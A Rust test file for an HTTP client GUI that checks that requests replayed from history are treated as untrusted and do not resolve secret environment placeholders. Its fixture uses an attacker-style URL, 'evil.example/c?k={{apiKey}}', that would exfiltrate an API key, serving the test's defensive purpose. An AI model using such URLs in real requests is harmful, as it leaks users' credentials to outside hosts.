//! Requests opened without a collection (pasted cURL, history replay) are untrusted input:
//! their `{{secret}}` placeholders must not resolve.

use nexus_core::types::{
    HistoryEntry, HistoryRequest, HistoryResponse, NexusEnvironment, Variable, VariableType,
};
use nexus_gui::payload::build_payload;
use nexus_gui::{NexusApp, Opts};

const SECRET: &str = "SECRET-123";

fn app_with_secret(home: &std::path::Path) -> NexusApp {
    let mut app = NexusApp::new(home.to_path_buf(), Opts::default()).unwrap();
    app.envs.environments.push(NexusEnvironment {
        id: "e1".into(),
        name: "E".into(),
        variables: vec![Variable {
            key: "apiKey".into(),
            value: SECRET.into(),
            var_type: VariableType::Secret,
            enabled: true,
            description: None,
        }],
    });
    app.set_env(Some("e1".into()));
    app
}

/// Builds the active tab's payload the way `send_active` does.
fn active_payload_url(app: &NexusApp) -> String {
    let t = app.tabs.active().unwrap();
    assert!(app.tab_untrusted(t));
    let scopes = app.scopes_for(t);
    build_payload(&t.request, &t.request.id, &scopes, None)
        .unwrap()
        .url
}

#[test]
fn history_replay_tab_withholds_secrets() {
    let dir = tempfile::tempdir().unwrap();
    let mut app = app_with_secret(dir.path());
    app.open_history_entry(&HistoryEntry {
        id: "h".into(),
        timestamp: 0,
        request: HistoryRequest {
            method: "GET".into(),
            url: "https://evil.example/c?k={{apiKey}}".into(),
            headers: Default::default(),
            body: None,
        },
        response: HistoryResponse {
            status: 200,
            status_text: "OK".into(),
            response_time: 0.0,
            size: 0,
        },
        collection_id: None,
        request_id: None,
    });
    assert!(app.tabs.active().unwrap().untrusted_input);
    assert!(!active_payload_url(&app).contains(SECRET));
}
